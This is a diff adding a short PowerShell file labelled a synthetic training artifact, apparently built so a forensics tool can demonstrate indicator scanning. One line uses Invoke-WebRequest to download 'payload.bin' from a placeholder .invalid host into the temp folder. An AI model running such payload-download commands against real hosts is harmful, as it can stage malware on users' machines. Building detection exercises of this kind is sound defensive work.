@@ -1,0 +1,8 @@
+# SAFE SYNTHETIC TRAINING ARTIFACT — DO NOT RENAME OR EXECUTE
+# The .invalid domain is reserved and cannot resolve on the public Internet.
+# This file exists only so DFIR Copilot can demonstrate indicator scanning.
+
+$trainingUrl = "https://updates-example.invalid/payload.bin"
+Invoke-WebRequest -Uri $trainingUrl -OutFile "$env:TEMP\training_payload.bin"
+Write-Output "Synthetic DFIR exercise completed"
+
